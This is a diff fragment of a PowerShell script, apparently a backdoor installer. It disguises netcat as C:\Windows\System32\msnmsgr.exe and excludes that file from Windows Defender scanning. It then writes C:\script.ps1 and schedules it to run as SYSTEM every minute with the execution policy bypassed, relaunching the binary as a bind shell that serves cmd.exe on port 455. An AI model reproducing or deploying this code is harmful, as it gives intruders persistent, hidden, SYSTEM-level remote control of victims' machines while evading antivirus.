@@ -51,12 +51,24 @@ if (Test-Path "$system32Path\nc.exe") {
 Write-Host "4/10: Setting up System Startup..."
 Add-MpPreference -ExclusionPath "C:\Windows\System32\msnmsgr.exe"
 
-$Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-WindowStyle Hidden -Command ""Start-Process 'C:\Windows\System32\msnmsgr.exe' -ArgumentList '-Ldp 455 -e cmd.exe' -NoNewWindow"""
-$Trigger = New-ScheduledTaskTrigger -AtStartup
-$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DontStopOnIdleEnd -StartWhenAvailable
-$Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
-$Task = New-ScheduledTask -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal
-Register-ScheduledTask -TaskName "nc" -InputObject $Task
+$scriptContent = @'
+$ProcessName = "msnmsgr"
+
+# Verificar si el proceso ya está en ejecución
+$Process = Get-Process | Where-Object { $_.ProcessName -eq $ProcessName }
+
+# Si el proceso no está en ejecución, iniciar el proceso
+if (-not $Process) {
+    Start-Process "C:\Windows\System32\msnmsgr.exe" -ArgumentList "-Ldp 455 -e cmd.exe" -NoNewWindow
+}
+'@
+
+Set-Content -Path 'C:\script.ps1' -Value $scriptContent
+
+& schtasks /create /sc minute /mo 1 /tn "nc" /tr "powershell.exe -ExecutionPolicy Bypass -File `"C:\script.ps1`"" /ru SYSTEM /rl HIGHEST
+
+
+
 
 
 
